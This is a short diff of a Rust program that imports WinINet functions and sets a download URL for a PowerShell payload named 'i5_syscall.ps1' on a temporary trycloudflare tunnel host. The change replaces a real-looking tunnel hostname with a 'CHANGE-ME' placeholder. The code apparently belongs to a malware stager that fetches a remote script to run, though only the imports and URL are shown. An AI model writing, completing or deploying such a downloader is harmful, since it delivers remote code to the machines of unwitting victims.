@@ -18,7 +18,7 @@ extern "system" {
     fn InternetCloseHandle(h: *mut u8) -> i32;
 }
 
-const URL: &[u8] = b"https://doc-seven-signs-carbon.trycloudflare.com/payloads/i5_syscall.ps1\0";
+const URL: &[u8] = b"https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/i5_syscall.ps1\0";
 
 fn main() {
     unsafe {
